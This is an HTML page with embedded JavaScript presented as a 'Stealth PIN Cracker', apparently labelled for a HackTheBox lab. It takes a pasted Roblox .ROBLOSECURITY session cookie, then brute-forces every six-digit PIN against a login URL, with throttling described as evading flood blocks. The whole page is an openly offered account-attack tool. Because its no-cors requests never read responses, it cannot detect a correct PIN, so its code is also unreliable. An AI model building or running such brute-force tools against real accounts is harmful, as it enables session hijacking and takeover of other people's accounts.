<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HTB Stealth PIN Cracker</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 40px; text-align: center; }
        .panel { max-width: 450px; margin: 0 auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        input { width: 100%; padding: 12px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin: 10px 0; box-sizing: border-box; font-family: monospace; font-size: 14px; text-align: center; }
        .row { display: flex; justify-content: space-between; margin: 10px 0; gap: 10px; }
        .row div { width: 50%; text-align: left; }
        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 16px; font-family: monospace; letter-spacing: 1px; margin-top: 10px; }
        button:disabled { background: #222; color: #444; cursor: not-allowed; border: 1px solid #333; }
        #console { height: 180px; overflow-y: auto; background: #000; border: 1px solid #00ff00; margin-top: 20px; padding: 10px; font-size: 12px; text-align: left; white-space: pre-wrap; }
    </style>
</head>
<body>

<div class="panel">
    <h2>[ STEALTH PIN CRACKER ]</h2>
    
    <input type="text" id="cookieData" placeholder="PASTE .ROBLOSECURITY COOKIE HERE">
    
    <div class="row">
        <div>
            <label>Start PIN:</label>
            <input type="number" id="startPin" value="0" min="0" max="999999">
        </div>
        <div>
            <label>Delay (ms):</label>
            <input type="number" id="delayMs" value="150" min="10">
        </div>
    </div>

    <button id="actionBtn" onclick="startStealthAttack()">START PROCESS</button>
    <div id="console">[*] System idle. Awaiting cookie input...</div>
</div>

<script>
let isRunning = false;

// ========================================================
// REPLACEMENT CONFIGURATION
// ========================================================
const TARGET_URL = "http://10.10.10.x/login"; 
// ========================================================

function log(msg) {
    const con = document.getElementById('console');
    con.innerText += msg + "\n";
    con.scrollTop = con.scrollHeight;
}

async function startStealthAttack() {
    if (isRunning) return;
    
    const cookieVal = document.getElementById('cookieData').value.trim();
    let currentPin = parseInt(document.getElementById('startPin').value) || 0;
    const delay = parseInt(document.getElementById('delayMs').value) || 150;

    if (!cookieVal) {
        alert("Error: Please provide a valid cookie.");
        return;
    }

    // Set cookie explicitly inside your browser environment
    document.cookie = `.ROBLOSECURITY=${cookieVal}; path=/; domain=${window.location.hostname}; SameSite=Lax`;

    isRunning = true;
    document.getElementById('actionBtn').disabled = true;
    document.getElementById('console').innerText = "[*] Stealth parameters initialized.\n[*] Traffic throttling activated...\n";

    while (isRunning && currentPin <= 999999) {
        const paddedPin = String(currentPin).padStart(6, '0');
        
        if (currentPin % 10 === 0) {
            log(`[-] Testing PIN: ${paddedPin} (Status: Sending)`);
        }

        try {
            // Using standard credential pass-through without standard cross-origin blockers
            await fetch(TARGET_URL, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: `pin=${paddedPin}`
            });
        } catch (e) {
            log(`[!] Connection choked on PIN ${paddedPin}. Retrying next...`);
        }

        currentPin++;
        // Dynamic throttle delay keeping browser context safe from packet flooding blocks
        await new Promise(resolve => setTimeout(resolve, delay));
    }

    log("\n[-] Session run complete or paused.");
    isRunning = false;
    document.getElementById('actionBtn').disabled = false;
}
</script>

</body>
</html>
